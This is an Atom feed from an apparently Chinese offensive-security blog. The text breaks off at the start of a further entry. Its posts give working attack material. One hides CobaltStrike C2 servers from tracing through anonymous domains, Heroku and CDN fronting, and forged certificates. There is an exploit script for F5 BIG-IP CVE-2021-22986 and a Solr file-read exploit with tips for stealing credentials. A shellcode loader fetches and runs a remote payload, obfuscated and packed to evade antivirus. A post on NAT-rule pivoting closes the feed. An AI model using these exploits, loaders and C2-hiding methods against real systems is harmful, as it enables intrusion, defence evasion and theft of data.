<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://www.svenbeast.com</id>
    <title>攻城肾透shi | sv3nbeast</title>
    <updated>2021-04-14T16:04:55.699Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://www.svenbeast.com"/>
    <link rel="self" href="https://www.svenbeast.com/atom.xml"/>
    <subtitle>Let&apos;s start learning，不在平静中灭亡~  </subtitle>
    <logo>https://www.svenbeast.com/images/avatar.png</logo>
    <icon>https://www.svenbeast.com/favicon.ico</icon>
    <rights>All rights reserved 2021, 攻城肾透shi | sv3nbeast</rights>
    <entry>
        <title type="html"><![CDATA[CobaltStrike的隐藏记录]]></title>
        <id>https://www.svenbeast.com/post/ny5NkDd40/</id>
        <link href="https://www.svenbeast.com/post/ny5NkDd40/">
        </link>
        <updated>2021-04-14T14:52:59.000Z</updated>
        <content type="html"><![CDATA[<h2 id="1-cobaltstrike的服务端隐藏">1. CobaltStrike的服务端隐藏</h2>
<pre><code>因为部分安全公司会不定时做全网的CobaltStrike服务端的识别，从而将IP标记为恶意服务器
因为一些网络测绘平台会检测CobaltStrike服务端的指纹，从而对服务器进行标记
为避免以上情况，所以需要对服务端的特征进行隐藏，与威胁情报相对抗
</code></pre>
<h3 id="11-修改默认端口">1.1 修改默认端口</h3>
<ul>
<li>打开teamserver，最后一行修改端口50050为其他端口</li>
</ul>
<figure data-type="image" tabindex="1"><img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/03/09/16990_image-20210309102126766.png" alt="image-20210309102126766" loading="lazy"></figure>
<h3 id="12-修改证书">1.2 修改证书</h3>
<ul>
<li>删除cobaltstrike.store</li>
<li>keytool -keystore ./cobaltstrike.store -storepass 设定一个密码 -keypass 刚才设定的密码 -genkey -keyalg RSA -alias baidu -dname &quot;CN=baidu.com, OU=service operation department, O=Beijing Baidu Netcom Science Technology Co., Ltd, L=beijing, S=beijing, C=CN&quot;</li>
<li>这样扫描这台的CS的server端占用端口的证书便无法确定运行的是CS</li>
</ul>
<figure data-type="image" tabindex="2"><img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/03/10/82792_image-20210310163655780.png" alt="image-20210310163655780" loading="lazy"></figure>
<h2 id="2-cobaltstrike的c2隐藏">2. CobaltStrike的C2隐藏</h2>
<pre><code>在攻防演练中，某种情况下导致攻击被目标发现，目标会顺着线索继续溯源追踪到具体执行人，而我们的服务器也就变成溯源方的攻击目标之一，遂需要对我们使用的有关上线使用的线索进行隐藏,同样也是为了与威胁情况相对抗
</code></pre>
<h3 id="21-申请免费域名">2.1 申请免费域名</h3>
<pre><code>原因是免费域名无需备案，即使域名泄露也不会跟踪到注册人
</code></pre>
<ul>
<li>通过freenom.com申请免费域名，无需实名</li>
</ul>
<p>教程: https://zhuanlan.zhihu.com/p/115535965</p>
<ul>
<li>将申请的域名转入dnspod下面进行管理(不转也行，dnspod为腾讯云计算公司全资控股)</li>
</ul>
<p>教程: https://blog.csdn.net/weixin_46021924/article/details/104859155</p>
<figure data-type="image" tabindex="3"><img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/03/10/45124_image-20210310221853295.png" alt="image-20210310221853295" loading="lazy"></figure>
<ul>
<li>创建一个A记录指向cs服务器</li>
</ul>
<figure data-type="image" tabindex="4"><img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/03/10/31716_image-20210310230721958.png" alt="image-20210310230721958" loading="lazy"></figure>
<h3 id="22-隐藏c2的具体ip">2.2 隐藏C2的具体IP</h3>
<pre><code>原因是隐藏后即使域名泄露，目标也不会知道具体C2的IP地址，无法发起对我们C2服务器的溯源攻击
</code></pre>
<h4 id="221-方法1一利用heruko隐藏">2.2.1 方法1一利用heruko隐藏</h4>
<pre><code>- 暴露信息:
	1.固定域名(heroku的)
	2.随机IP(heroku的)
- 优点:
	1.服务端的域名隐藏
	2.服务端的IP隐藏
	3.布置简单
	4.自带可信的SSL证书
	5.免费
- 缺点:
	1.上线速度慢
</code></pre>
<ul>
<li>
<p>注册Heroku账号，点击 <a href="https://dashboard.heroku.com/">https://dashboard.heroku.com</a> 通过gmail邮箱或者其他邮箱注册一个账号</p>
</li>
<li>
<p>然后部署应用，<a href="https://dashboard.heroku.com/new?template=https://github.com/sv3nbeast/nginx-proxy-heroku">Fork的rootkit师傅项目，heruko的nginx代理部署链接</a>，App name的名字自行设置，为一会heroku生成的域名的前缀，个别时候会heroku会识别不到项目，遇到的话需要自己fork用github登录heroku</p>
</li>
<li>
<p>TARGET，填刚才申请的域名，端口自行设置</p>
</li>
</ul>
<figure data-type="image" tabindex="5"><img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/03/10/68775_image-20210310234240398.png" alt="image-20210310234240398" loading="lazy"></figure>
<ul>
<li>新建监听器1，域名填申请的域名，端口填heroku设置的target的端口</li>
</ul>
<img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/03/11/34196_image-20210311005227408.png" alt="image-20210311005227408" style="zoom:33%;" />
<ul>
<li>新建监听器2，端口设置443，域名为heroku的应用域名，点击open app查看域名</li>
</ul>
<figure data-type="image" tabindex="6"><img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/03/11/90060_image-20210311005558295.png" alt="image-20210311005558295" loading="lazy"></figure>
<img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/03/11/41869_image-20210311005401376.png" alt="image-20210311005401376" style="zoom: 33%;" />
<p>测试上线，随便生成个exe，监听器选择监听器2，运行上线，显示的上线监听器为监听器1</p>
<figure data-type="image" tabindex="7"><img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/03/11/64899_image-20210311010409501.png" alt="image-20210311010409501" loading="lazy"></figure>
<h4 id="222-方法2利用微林隐藏">2.2.2 方法2—利用微林隐藏</h4>
<pre><code>- 暴露信息:
	1.固定IP(微林的)
- 优点:
	1.服务端的域名隐藏
	2.服务端的IP隐藏
	3.上线速度快，只比用服务器IP慢2s左右
	4.布置简单
- 缺点:
	1.一点点钱
	2.只能使用微林服务器固定IP上线（尝试用过域名解析指向，但是总被拦，内容显示非法阻断）
</code></pre>
<ul>
<li>注册微林账号，https://www.vx.link，其他提供类似服务的平台也是可以使用的</li>
<li>购买包月套餐，最便宜的即可</li>
<li>配置微林
<ul>
<li>流量优化-为服务器添加授权（就是C2服务器）</li>
<li>流量优化-创建新的 vxTrans 链接点（配置转发）</li>
</ul>
</li>
<li>设置域名解析(其实微林只是他有几台服务器然后转发你设置的端口的流量而已，他的IP也是固定的)
<ul>
<li>示例中我用的中国2这台，ping他的域名得知IP为182.118.xx.xx</li>
</ul>
</li>
</ul>
<img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/03/13/85725_image-20210313212542442.png" alt="image-20210313212542442" style="zoom:33%;" />
<img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/03/13/18706_image-20210313213025988.png" alt="image-20210313213025988" style="zoom:33%;" />
<img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/03/13/11409_image-20210313213243813.png" alt="image-20210313213243813" style="zoom:33%;" />
<img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/03/13/83290_image-20210313213743438.png" alt="image-20210313213743438" style="zoom:33%;" />
<img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/03/13/30526_image-20210313214205286.png" alt="image-20210313214205286" style="zoom:33%;" />
<ul>
<li>新建监听器1，端口为微林转发到服务器设置的10000端口，域名为c2服务器自身IP</li>
</ul>
<img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/03/13/99142_image-20210313215352221.png" alt="image-20210313215352221" style="zoom:33%;" />
<ul>
<li>新建监听器2，域名填微林服务器IP 182.118.xx.xx，端口填微林转发到服务器设置的3xxxx端口</li>
</ul>
<img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/03/13/54321_image-20210313224734746.png" alt="image-20210313224734746" style="zoom:33%;" />
<ul>
<li>测试上线，随便生成个exe，监听器选择监听器2，运行上线，显示的上线监听器为监听器1</li>
</ul>
<img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/03/13/18403_image-20210313225051771.png" alt="image-20210313225051771" style="zoom:33%;" />
<h4 id="223-方法3利用国外cdn隐藏">2.2.3 方法3—利用国外CDN隐藏</h4>
<pre><code>- 暴露信息:
	1.固定域名(自己的免费域名)
	2.随机IP(CDN厂商的)
- 优点:
	1.服务端的IP隐藏
	2.免费
- 缺点:
	1.上线速度慢
</code></pre>
<ul>
<li>注册https://www.cloudflare.com/，按照网站教程为免费域名部署CDN</li>
<li>开启 缓存—开发者模式，否则无法执行命令，以后使用的时候也要检查是否开启，此项会不定时自动关闭</li>
</ul>
<figure data-type="image" tabindex="8"><img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/03/14/30160_image-20210314000041694.png" alt="image-20210314000041694" loading="lazy"></figure>
<figure data-type="image" tabindex="9"><img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/03/14/15382_image-20210314000054829.png" alt="image-20210314000054829" loading="lazy"></figure>
<ul>
<li>免费套餐限制了使用的端口， cloudflare可访问的端口](https://support.cloudflare.com/hc/zh-cn/articles/200169156-Identifying-network-ports-compatible-with-Cloudflare-s-proxy)</li>
</ul>
<p>![image-20210315161418765](../Library/Application Support/typora-user-images/image-20210315161418765.png)</p>
<ul>
<li>注意生成的信息手动复制保存一下，xxx.pem,xxx.key</li>
</ul>
<figure data-type="image" tabindex="10"><img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/03/15/49510_image-20210315161745446.png" alt="image-20210315161745446" loading="lazy"></figure>
<ul>
<li>
<p>生成xxxxxx.p12</p>
<pre><code>openssl pkcs12 -export -in xxx.pem -inkey xxx.key -out domain.p12 -name 免费域名 -passout pass:设定一个密码
</code></pre>
</li>
<li>
<p>生成新的cobaltstrike.store文件，我命名为new.store</p>
<pre><code>keytool -importkeystore -deststorepass 密码 -destkeypass 密码 -destkeystore new.store -srckeystore spoofdomain.p12 -srcstoretype PKCS12 -srcstorepass 密码 -alias 免费域名
</code></pre>
</li>
<li>
<p>配置C2.profile，附copy的一个配置文件，自行修改，填好后用c2lint c2.profile验证一下</p>
<pre><code>git clone https://github.com/FortyNorthSecurity/C2concealer.git
cd C2concealer
./install.sh
C2concealer --variant 1 --hostname 免费域名
3
new.store的路径
new.store的密码
成功生成xxxx.profile
c2lint  xxxx.profile    确定这个配置文件是否能正常工作
</code></pre>
<figure data-type="image" tabindex="11"><img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/03/16/42203_image-20210316214451764.png" alt="image-20210316214536129" loading="lazy"></figure>
<figure data-type="image" tabindex="12"><img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/03/16/83780_image-20210316214656038.png" alt="image-20210316214656038" loading="lazy"></figure>
<figure data-type="image" tabindex="13"><img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/03/15/71601_image-20210315171619817.png" alt="image-20210315171619817" loading="lazy"></figure>
</li>
<li>
<p>修改teamserver配置</p>
<pre><code>vim teamserver
最后一行找对应的改一下
-Djavax.net.ssl.keyStore=./new.store （证书生成的new.store文件地址）
-Djavax.net.ssl.keyStorePassword=xxxxxx（上面store文件的密码）
</code></pre>
</li>
<li>
<p>创建监听器</p>
</li>
</ul>
<img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/03/16/46721_image-20210316215008348.png" alt="image-20210316215008348" style="zoom:33%;" />
<ul>
<li>测试上线，随便生成个exe，选择创建的监听器，运行上线，大概11秒主机上线</li>
</ul>
<h4 id="224-方法4利用国内cdn隐藏">2.2.4 方法4—利用国内CDN隐藏</h4>
<pre><code>- 暴露信息:
	1.固定域名
	2.随机IP(CDN厂商的)
- 优点:
	1.高信域名
	2.IP也是CDN的IP
	3.上线速度快
- 缺点:
	1.一点点钱
	2.不能被CDN所属公司的溯源队伍碰到
</code></pre>
<p>使用腾讯云的全站加速举例</p>
<figure data-type="image" tabindex="14"><img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/04/14/22495_image-20210414221746977.png" alt="image-20210414221746977" loading="lazy"></figure>
<p>点击提交后，本地ping或者用站长之家的ping功能对腾讯云提供的CNAME那个域名进行ping，获得目标IP，这样就可以利用cdn使用host来识别请求域名来进行通信了</p>
<pre><code>可以使用命令进行检查是否可以正常通信
curl -v  -H &quot;Host: test1.baidu.com&quot; http://目标IP/test
</code></pre>
<figure data-type="image" tabindex="15"><img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/03/18/91013_image-20210318130101028.png" alt="image-20210318130101028" loading="lazy"></figure>
<p>然后新建一个监听，profile文件可以在网上找一个，把里面的host都改成cdn的域名</p>
<figure data-type="image" tabindex="16"><img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/04/14/31183_image-20210414224012427.png" alt="image-20210414224012427" loading="lazy"></figure>
<h2 id="3-cobaltstrike的上线端隐藏">3. CobaltStrike的上线端隐藏</h2>
<pre><code>因为目标的安全建设多有一些流量监测设备和其他安全设备，会对CobaltStrike的上线流量进行指纹识别，从而进行报警拦截，根据暴露的域名或者主机，还会导致被溯源的几率大大增加。
故需要对上线端-&gt;服务端的特征进行隐藏，与溯源、威胁情报、IP封禁进行对抗
</code></pre>
<p>利用Profile配置文件对目标到C2之间的流量和证书进行自定义配置，达到尽量减少特征的目的，具体内容，鸽了鸽了。。毕竟是以前的笔记0.0</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CVE-2021-22986 F5 BIG-IP 未授权命令执行]]></title>
        <id>https://www.svenbeast.com/post/6XXqeGdEj/</id>
        <link href="https://www.svenbeast.com/post/6XXqeGdEj/">
        </link>
        <updated>2021-03-19T10:30:38.000Z</updated>
        <content type="html"><![CDATA[<p>安装f5 BIG-IP,<a href="https://downloads-use-f5.s3.amazonaws.com/big-ip/big-ip_v16.x/16.0.1/english/16.0.1_virtual-edition/BIGIP-16.0.1-0.0.3.ALL-vmware.ova?response-content-disposition=attachment%3B%20filename%3DBIGIP-16.0.1-0.0.3.ALL-vmware.ova&amp;X-Amz-Security-Token=FwoGZXIvYXdzEDIaDNcBAGKbhxiImEQILCKCATWrvmK9QpzDornY84q2SskKWJ%2BlVGgQYDEWR8LHmFc4ZKhfJp1rnNkuaSi7EDG4Jb3f%2F7UcNtFpF%2BiLCREjgRLtcmyb5q0Jl%2BCiIp4%2BtjH7FlpCE95pUcknI5JyZaHyvtOieRnwY6DSV4%2BHnWt3CpMhdshiYWuenOpFssPuHsUaXg4o9sXRggYyKGzINRW8biLIoddlvsTswtYnww3vzBRTIG1B8s%2BraBIXC7GY%2F%2FiNpzE%3D&amp;X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Date=20210319T083814Z&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Expires=86399&amp;X-Amz-Credential=ASIAWZEHK3GDHP2TSXL5%2F20210319%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Signature=543b7055452ae8270a343b2ce5951bea27393a4667f9cac7988adede3e24b011">fq点击下载</a></p>
<figure data-type="image" tabindex="1"><img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/03/19/29834_image-20210319164457003.png" alt="image-20210319164457003" loading="lazy"></figure>
<p>然后双击.ova或者导入VirtualBox中打开虚拟机，设置一个强密码</p>
<pre><code>诶嘿~ 。。我的安好了，特别小，可能是我屏幕分辨率太高的原因，也不太会用这个box
依次输入
root
default
default
123!@#qwe  (随便设置一个强口令，否则无法通过)
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/03/19/45638_image-20210319170318231.png" alt="image-20210319170318231" loading="lazy"></figure>
<p>获得IP,因为我的屏幕太小，所以用的ifconfig|more一行一行倒的</p>
<figure data-type="image" tabindex="3"><img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/03/19/82409_image-20210319172306832.png" alt="image-20210319172306832" loading="lazy"></figure>
<p>目标地址:https://192.168.0.107，尝试使用 <strong>admin/刚才设置的强口令</strong>进行登录，第一次登录让修改密码，照做便是。</p>
<figure data-type="image" tabindex="4"><img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/03/19/47073_image-20210319172937158.png" alt="image-20210319172937158" loading="lazy"></figure>
<figure data-type="image" tabindex="5"><img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/03/19/15565_image-20210319173206657.png" alt="image-20210319173206657" loading="lazy"></figure>
<p>Payload</p>
<pre><code>POST /mgmt/tm/util/bash HTTP/1.1
Host: 192.168.0.107
Connection: close
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: python-requests/2.25.0
Authorization: Basic YWRtaW46c3YzbmJlYXN0
X-F5-Auth-Token: 
Content-Length: 42
Content-Type: application/json

{&quot;utilCmdArgs&quot;: &quot;-c id&quot;, &quot;command&quot;: &quot;run&quot;}
</code></pre>
<figure data-type="image" tabindex="6"><img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/03/19/12623_image-20210319174457234.png" alt="image-20210319174457234" loading="lazy"></figure>
<p>Exp</p>
<pre><code class="language-python">import requests,sys,json
from requests.auth import HTTPBasicAuth
requests.packages.urllib3.disable_warnings()

banner = '''
  __ _____  ______ _____ _____     ___________ 
 / _|  ___| | ___ \_   _|  __ \   |_   _| ___ \\
| |_|___ \  | |_/ / | | | |  \/_____| | | |_/ /
|  _|   \ \ | ___ \ | | | | _|______| | |  __/ 
| | /\__/ / | |_/ /_| |_| |_\ \    _| |_| |    
|_| \____/  \____/ \___/ \____/    \___/\_|    
                                               
                            by 斯文            
'''

def exp(url,cmd):

    try:

        session = requests.Session()

        rawBody = &quot;{{\&quot;utilCmdArgs\&quot;: \&quot;-c {}\&quot;, \&quot;command\&quot;: \&quot;run\&quot;}}&quot;.format(cmd)
        headers = {&quot;Accept&quot;:&quot;*/*&quot;,&quot;Connection&quot;:&quot;close&quot;,&quot;User-Agent&quot;:&quot;python-requests/2.25.0&quot;,&quot;Accept-Encoding&quot;:&quot;gzip, deflate&quot;,&quot;X-F5-Auth-Token&quot;:&quot;&quot;,&quot;Content-Type&quot;:&quot;application/json&quot;}
        response = session.post(&quot;{}/mgmt/tm/util/bash&quot;.format(url), data=rawBody,headers=headers, verify=False,auth=HTTPBasicAuth(&quot;admin&quot;,&quot;test&quot;))
        result = json.loads(response.content)
        print(&quot;&gt;url: {}&quot;.format(url))
        print(&quot;&gt;command: {}&quot;.format(cmd))
        print(&quot;&gt;result: \n\n{}&quot;.format(result['commandResult']))

    except Exception as e:
        # print(e)
        print(&quot;Not vul&quot;)


if __name__ == &quot;__main__&quot;:
    print(banner)
    exp(sys.argv[1],sys.argv[2])
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Solr 文件读取复现附EXP及个人Tips]]></title>
        <id>https://www.svenbeast.com/post/320hjX2MI/</id>
        <link href="https://www.svenbeast.com/post/320hjX2MI/">
        </link>
        <updated>2021-03-18T13:43:11.000Z</updated>
        <content type="html"><![CDATA[<p>下载<a href="https://mirrors.tuna.tsinghua.edu.cn/apache/lucene/solr/8.8.1/solr-8.8.1.zip">Solr</a></p>
<pre><code>cd solr-8.8.1/bin
./solr start -p 8989
</code></pre>
<p>然后add core</p>
<pre><code>cd /solr-8.8.1/server/solr/
mkdir newcore
复制 /solr-8.8.1/server/solr/configsets/_default的conf文件夹进入刚才创建的newcore文件夹
网页上点击Add Core
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/03/18/89329_image-20210318212131855.png" alt="image-20210318212131855" loading="lazy"></figure>
<p>获得core名字</p>
<pre><code>http://127.0.0.1:8989/solr/admin/cores?action=STATUS
</code></pre>
<p>打开 remote streaming</p>
<pre><code>curl -d '{  &quot;set-property&quot; : {&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;:true}}' http://127.0.0.1:8989/solr/newcore/config -H 'Content-type:application/json' 
</code></pre>
<p>进行文件读取</p>
<pre><code>curl &quot;http://127.0.0.1:8989/solr/newcore/debug/dump?param=ContentStreams&quot; -F &quot;stream.url=file:////etc/passwd&quot; 
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/03/18/21567_image-20210318212947515.png" alt="image-20210318212947515" loading="lazy"></figure>
<p>Exp : https://github.com/sv3nbeast/Solr-file_read</p>
<figure data-type="image" tabindex="3"><img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/03/18/52513_image-20210318214215711.png" alt="image-20210318214215711" loading="lazy"></figure>
<pre><code class="language-python">import requests
import sys,re,json
import threadpool
#from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings()

banner = '''
   _____       _        _____                _ 
  / ____|     | |      |  __ \              | |
 | (___   ___ | |_ __  | |__) |___  __ _  __| |
  \___ \ / _ \| | '__| |  _  // _ \/ _` |/ _` |
  ____) | (_) | | |    | | \ \  __/ (_| | (_| |
 |_____/ \___/|_|_|    |_|  \_\___|\__,_|\__,_|
                                               
                            by 斯文            
'''

def exp(url):

    try:
        dbName = getDb(url)
        
        if dbName:

            session = requests.Session()
            rawBody = &quot;{  \&quot;set-property\&quot; : {\&quot;requestDispatcher.requestParsers.enableRemoteStreaming\&quot;:true}}&quot;
            headers = {&quot;User-Agent&quot;:&quot;hack by sskkaayy&quot;,&quot;Connection&quot;:&quot;close&quot;,&quot;Content-type&quot;:&quot;application/json&quot;,&quot;Accept&quot;:&quot;*/*&quot;}
            response = session.post(&quot;{}/solr/{}/config&quot;.format(url,dbName), data=rawBody, headers=headers)
            
            print(&quot;&gt;Core: {}&quot;.format(dbName))

            while True:
                linux = File(url,dbName)
                try:
                    print('&gt;result:\n')

                    if 'Permission' in str(linux):
                        print('Permission denied\n')
                        continue
                    if 'No such file or directory' in str(linux):
                        print('No such file or directory\n')
                        continue
                    linux = json.loads(linux)
                    if linux['streams']:
                        print(linux['streams'][0]['stream'])
                except:
                    r = re.compile('''&lt;str name=&quot;stream&quot;&gt;(.*?)&lt;/str&gt;''')
                    Str = re.findall(r,str(linux))
                    res = Str[0].replace('\\n','\n')
                    print(res + '\n')


    except Exception as e:
        print(e)
        # print(&quot;Not vul&quot;)

def File(url,dbName):

    session = requests.Session()
    paramsGet = {&quot;param&quot;:&quot;ContentStreams&quot;}
    path = input(&quot;&gt;Path: &quot;)
    paramsPost = {&quot;stream.url&quot;:&quot;file:///{}&quot;.format(path)}
    headers = {&quot;User-Agent&quot;:&quot;hack by sskkaayy&quot;,&quot;Connection&quot;:&quot;close&quot;,&quot;Accept&quot;:&quot;*/*&quot;}
    response = session.post(&quot;{}/solr/{}/debug/dump&quot;.format(url,dbName), data=paramsPost, params=paramsGet, headers=headers)

    return response.content

def getDb(url):

    try:
        target = url + '/solr/admin/cores?action=STATUS'
        response = requests.get(target,verify=False,timeout=20)
        data = response.text
        if '关于全网部署360私有云的通知' in data:
            print('[- 蜜罐烦死啦!')
            return False

        try:
            r = re.compile('''&quot;status&quot;:{
    &quot;(.*?)&quot;:{''')
            Str = re.findall(r,str(data))
            dbName = Str[0]
        except:
            r = re.compile('''&lt;str name=&quot;name&quot;&gt;(.*?)&lt;/str&gt;''')
            Str = re.findall(r,str(data))
            dbName = Str[0]

    except Exception as e:
        return False
    return dbName

if __name__ == &quot;__main__&quot;:
    print(banner)
    exp(sys.argv[1])

</code></pre>
<p>Tips</p>
<pre><code># Solr 文件读取深度利用
- 第一个
{ 面板的-Djetty.home 路径}/solr/core名/conf/solrconfig.xml
结果搜 &quot;config&quot; 获得文件名字
- 第二个
/home/用户名/.bash_history
- 第三个
/opt/solr/server/solr/configsets/_default/conf/solrconfig.xml
结果搜 &quot;config&quot;  获得数据库账号密码
- 第四个
直接读目录可以把目录下的文件都显示出来，类似命令ls
- 第五个
此处支持SSRF，可考虑如何构造继续探测内网，比如redis
</code></pre>
<p>PS:</p>
<p>老版本回显是xml格式，新版本是json格式，部分检测工具是没有覆盖全，我的POC没有这种问题</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[BypassAV的CS上线]]></title>
        <id>https://www.svenbeast.com/post/c5POOWPbA/</id>
        <link href="https://www.svenbeast.com/post/c5POOWPbA/">
        </link>
        <updated>2021-03-09T15:40:57.000Z</updated>
        <content type="html"><![CDATA[<p>CS生成c语言的payload，取其中的shellcode，base64加密后放入shellcode.txt，放入公网vps的web服务中</p>
<p>shellcode=&quot;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00'</p>
<pre><code class="language-python">import ctypes,urllib.request,codecs,base64
shellcode = urllib.request.urlopen('http://ip/shellcode.txt').read()
shellcode = shellcode.strip()
shellcode = base64.b64decode(shellcode)
shellcode =codecs.escape_decode(shellcode)[0]
shellcode = bytearray(shellcode)
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_uint64(ptr), 
    buf, 
    ctypes.c_int(len(shellcode)))
handle = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0), 
    ctypes.c_int(0), 
    ctypes.c_uint64(ptr), 
    ctypes.c_int(0), 
    ctypes.c_int(0), 
    ctypes.pointer(ctypes.c_int(0))
)
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))
</code></pre>
<p>上面代码复制后base64加密，放入loder.txt文件放入公网vps的web服务中</p>
<pre><code>import pickle
import ctypes,urllib.request,codecs,base64
sectr = urllib.request.urlopen('http://ip/loader.txt').read()
sectr = base64.b64decode(sectr).decode(&quot;utf-8&quot;)
class A(object):
    def __reduce__(self):
        return (exec, (sectr,))
ret = pickle.dumps(A())
ret_base64 = base64.b64encode(ret)
ret_decode = base64.b64decode(ret_base64)
pickle.loads(ret_decode)
</code></pre>
<p>上面代码改好vps的ip</p>
<p>pyminifier --nonlatin --replacement-length=10 shellcode.py</p>
<p>使用此命令进行混淆，更换代码，有没有这步都行，保险加上</p>
<p>使用以下打包过程，目的是尽量压缩pyinstaller的单文件大小，效果明显，10m-&gt;6.多m ，仍然够大，但已经努力缩小了</p>
<ul>
<li>
<p>pip3 install pipenv    //安装虚拟环境，为了压缩打包文件大小</p>
</li>
<li>
<p>新建文件夹当做pipenv的目录，最好是根路径</p>
</li>
<li>
<p>pipenv install</p>
</li>
<li>
<p>pipenv shell</p>
</li>
<li>
<p>pip3 install 安装木马需要的模块和pyinstaller</p>
</li>
<li>
<p>同目录放入upx.exe</p>
</li>
<li>
<p>pyinstaller -w -F --clean --key 8939usj8suxk2h3  -i ico.ico shellcode.py</p>
</li>
<li>
<p>--key选项加不加都行，看个人喜好</p>
</li>
</ul>
<p><strong>总结一下:</strong></p>
<p>2021·3·09</p>
<p>过火绒+360全家桶</p>
<p>卡巴斯基免费版不行，静态可以，执行就杀，内存杀得东南西北都不认得了</p>
<p>python+pyinstaller+upx+远程+混淆+无参，没有沙箱检测的代码，总感觉无参的可能存活时间不长，容易被360云沙箱标记，就看6m的大小360会不会自动上传吧</p>
<figure data-type="image" tabindex="1"><img src="https://typora-1257617803.cos.ap-beijing.myqcloud.com/typora/20210309232931.gif" alt="shell" loading="lazy"></figure>
<p>参考链接:https://blog.csdn.net/qq_40989258/article/details/113460218</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[NAT规则滥用导致的内网代理]]></title>
        <id>https://www.svenbeast.com/post/6_134ZiaS/</id>
        <link href="https://www.svenbeast.com/post/6_134ZiaS/">
        </link>
        <updated>2021-03-07T16:35:17.000Z</updated>
        <content type="html"><![CDATA[<h4 id="今日份study-notes">今日份Study notes</h4>
<ul>
<li>目标网站时内网DMZ区的某个端口映射到公网服务器某个端口上</li>
</ul>
<pre><code>场景:
1.目标公网服务器111.111.111.111:8080，为内网192.168.0.108:8080映射出来的网站
2.目标公网服务器的8081端口同样设置了映射到内网的某个端口
</code></pre>
<p>很多企业的Web服务使用了NAT端口映射来转发内网的网站，这种情况还会让渗透的时候在获得权限后，发现目标无法出网，无法代理到内网流量，使用reGeorg或者Neo-reGeorg等http代理工具的话速度却无法令人满意</p>
<p><strong>利用</strong>:</p>
<p>首先尝试扫描目标端口，以nmap为例，如果目标的某个端口，比如8081，扫描结果显示为close或者open，那么就可以直接使用socks5:111.111.111.111:8081来代理这台机器映射到的内网机器流量</p>
<ul>
<li>目标存在着未被使用的端口映射</li>
<li>获得权限后手动结束占用NAT端口的进程（非必要情况最好不要结束）</li>
</ul>
<p><strong>原因</strong></p>
<p>一般内网服务器映射公网的设置</p>
<figure data-type="image" tabindex="1"><img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/03/08/82531_image-20210308002551642.png" alt="image-20210308002551642" loading="lazy"></figure>
<p>利用iptables编写端口转发规则来达到内网服务转发公网的目的，然而有的时候设置的转发规则中的目标内网业务下线了，而NAT规则并没有一起删除，还有其他情况导致的此类NAT规则未删除，运行服务已停止的美妙场景</p>
<blockquote>
<p>ps: 拜读倾旋师傅<a href="https://payloads.online/archivers/2020-11-01/1">文章</a>看到的，觉得有必要记小本本，且还未真实尝试，有待实战确认哦</p>
</blockquote>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[frp改造]]></title>
        <id>https://www.svenbeast.com/post/HUSusAA15/</id>
        <link href="https://www.svenbeast.com/post/HUSusAA15/">
        </link>
